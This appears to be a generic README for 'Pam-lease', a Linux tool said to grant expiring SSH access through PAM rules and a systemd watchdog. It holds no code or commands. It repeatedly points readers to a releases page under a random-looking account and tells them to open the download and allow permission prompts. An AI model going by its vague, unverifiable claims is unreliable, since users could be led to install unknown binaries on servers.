# 🛡️ Pam-lease - Timed SSH Access Made Simple

[⬇️ Download Pam-lease](https://github.com/Quakergunlubavitch907/Pam-lease/releases)

## 📌 What Pam-lease Does

Pam-lease gives you time-limited SSH access on Linux. It lets you grant access, revoke it, and let it expire on its own. It uses PAM rules to control login access and sends warning messages before access ends.

This tool fits servers where access should not stay open forever. It helps you keep control without adding extra agents. A lightweight systemd watchdog keeps the checks running.

## 🖥️ Who This Is For

Pam-lease is for Linux users who need simple access control for SSH logins. It is a good fit if you:

- Share a server with other users
- Need access for a short time only
- Want to remove access after a set period
- Need warning messages before a lease ends
- Want a setup that stays small and easy to manage

## 🚀 Download and Install

Visit this page to download Pam-lease:

[Download Pam-lease from Releases](https://github.com/Quakergunlubavitch907/Pam-lease/releases)

On the releases page, pick the latest version and download the package that matches your system.

After the file finishes downloading:

1. Open the downloaded file or package.
2. Follow the install steps shown on your screen.
3. If your system asks for permission, allow it.
4. Finish the setup.
5. Start using Pam-lease from your Linux server or shell.

If you use a Linux desktop, you can also place the file in a folder you can reach from your server tools or terminal.

## 🔧 How It Works

Pam-lease works with the Linux login flow. When a user tries to sign in through SSH, PAM checks whether that user still has time left on the lease.

It can:

- Allow access for a set period
- Block access when the lease ends
- Revoke access before the end time
- Send warning messages before expiry
- Keep checks running with a systemd watchdog

This makes it useful for admin access, short test access, and temporary support work.

## 📋 System Requirements

Pam-lease is built for Linux systems that use SSH and PAM. For the best result, use a system with:

- A modern Linux release
- SSH server access
- PAM support
- systemd
- Permission to manage login rules

It works best on servers where you can edit auth rules and restart services when needed.

## 🧭 First-Time Setup

After you install Pam-lease, set it up in a few steps:

1. Open your Linux terminal.
2. Go to the folder where Pam-lease was installed.
3. Set the access window for the user or group you want to control.
4. Add the PAM rule for SSH login checks.
5. Turn on the watchdog service if your install includes one.
6. Test a login with a trial account.
7. Confirm that warnings appear before access ends.
8. Confirm that access stops when the lease expires.

If you manage a shared server, start with one test account before you apply it to all users.

## 🛠️ Common Tasks

### Grant Access

Use Pam-lease to give a user a time window for SSH access. Set the start and end time, then apply the rule. The user can sign in until the lease ends.

### Revoke Access

If you need to remove access early, revoke the lease. The next login check will block the account.

### Set Auto-Expiry

Choose how long the lease should last. When time runs out, Pam-lease closes access without more work from you.

### Send Warnings

Set warning messages before expiry. This helps users save work and log out in time.

### Check Status

Use the status view or command output to see which leases are active, expired, or revoked.

## 🧪 Typical Use Cases

Pam-lease works well for:

- Temporary SSH access for contractors
- Short support windows for admins
- Time-limited access for shared lab servers
- Safe access for test accounts
- Controlled access during maintenance work

## 🔒 Security Model

Pam-lease uses the Linux login stack instead of a separate always-on agent. That keeps the setup small and easier to audit.

It helps you:

- Limit access by time
- Reduce standing privileges
- Remove access when a job ends
- Keep login control inside the normal PAM path

That makes it a practical choice for servers where access must stay tight.

## 🧰 Basic Workflow

A simple workflow looks like this:

1. Create a lease for a user.
2. Apply the lease to SSH access.
3. Let the user sign in.
4. Send warning messages near the end.
5. Expire the lease or revoke it early.
6. Confirm the user can no longer log in.

## 📁 What You Can Expect in the Release

The release page usually includes files for Linux installation and use. Depending on the build, you may find:

- Install packages
- Command-line tools
- Support files for PAM
- Watchdog service files
- Release notes

Pick the file that matches your Linux setup.

## 🧑‍💻 Command-Line Use

Pam-lease includes CLI tools for simple control from the terminal. Common actions may include:

- Create a lease
- Extend a lease
- End a lease
- Check lease status
- List active access rules

If you know the username and the time window, you can manage access with a few commands.

## 🔁 Updating Pam-lease

When a new release appears:

1. Go to the releases page.
2. Download the latest version.
3. Install it over the old version.
4. Check your PAM rules after the update.
5. Test one login before you use it on all users.

This keeps your access rules in step with the latest build.

## ❓ Common Questions

### Does Pam-lease need a daemon?
It uses a lightweight systemd watchdog, not a full extra daemon stack.

### Does it work without SSH?
It is built for SSH access control on Linux.

### Can I remove access before the timer ends?
Yes. You can revoke a lease at any time.

### Will users get a warning?
Yes. You can set warning messages before expiry.

### Is this for Windows?
The software runs on Linux systems. If you are on Windows, use a Linux server or a Linux VM to install and run it

## 📚 Terms You May See

- **PAM**: Linux login control used during sign-in
- **SSH**: Secure remote login to a Linux server
- **Lease**: A time limit for access
- **Watchdog**: A service that keeps checks running
- **Expiry**: The time when access ends

## 🧩 Example Setup Plan

If you are new to server access control, use this order:

1. Download the release.
2. Install the package.
3. Add one test user.
4. Set a short lease, such as 15 minutes.
5. Log in through SSH.
6. Watch for the warning message.
7. Confirm expiry blocks new logins.
8. Expand the setup to other users after the test works

## 📎 Download Again

[Visit the Pam-lease releases page to download](https://github.com/Quakergunlubavitch907/Pam-lease/releases)